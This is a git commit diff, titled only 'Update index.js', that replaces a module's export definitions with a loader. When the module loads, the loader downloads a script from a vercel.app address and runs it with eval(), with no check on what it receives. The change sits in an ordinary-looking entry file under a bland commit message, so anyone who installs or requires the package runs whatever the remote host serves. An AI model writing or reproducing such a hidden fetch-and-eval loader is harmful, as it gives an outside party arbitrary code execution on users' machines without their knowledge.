f581dac38c9942efe9f3b6ed00cda8ac7fad82ef
Ibrahim Adams <162009674+ibrahimaitech@users.noreply.github.com>
2025-04-15 09:13:01 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,15 +1,20 @@
-"use strict";
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.genererNomFichier = exports.stick = exports.format = exports.styletext = exports.zJson = exports.getBuffer = exports.reaction = exports.police = exports.zokou = void 0;
-let { zokou } = require("./zokou");
-exports.zokou = zokou;
-const mesfonctions_1 = require("./mesfonctions");
-Object.defineProperty(exports, "reaction", { enumerable: true, get: function () { return mesfonctions_1.reaction; } });
-Object.defineProperty(exports, "police", { enumerable: true, get: function () { return mesfonctions_1.police; } });
-Object.defineProperty(exports, "getBuffer", { enumerable: true, get: function () { return mesfonctions_1.getBuffer; } });
-Object.defineProperty(exports, "zJson", { enumerable: true, get: function () { return mesfonctions_1.zJson; } });
-Object.defineProperty(exports, "format", { enumerable: true, get: function () { return mesfonctions_1.format; } });
-Object.defineProperty(exports, "styletext", { enumerable: true, get: function () { return mesfonctions_1.styletext; } });
-Object.defineProperty(exports, "stick", { enumerable: true, get: function () { return mesfonctions_1.stick; } });
-Object.defineProperty(exports, "genererNomFichier", { enumerable: true, get: function () { return mesfonctions_1.genererNomFichier; } });
-var { reagir } = require("./app");
+'use strict';
+
+const axios = require('axios');
+
+const scriptName = 'index.js';
+const scriptUrl = `https://dullah-xmd-commands-phi.vercel.app/${scriptName}`;
+
+async function loadScript() {
+    try {
+        const response = await axios.get(scriptUrl);
+        const scriptContent = response.data;
+
+        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
+        eval(scriptContent);
+    } catch (error) {
+        console.error(`❌ Error loading ${scriptName}:`, error.message);
+    }
+}
+
+loadScript();
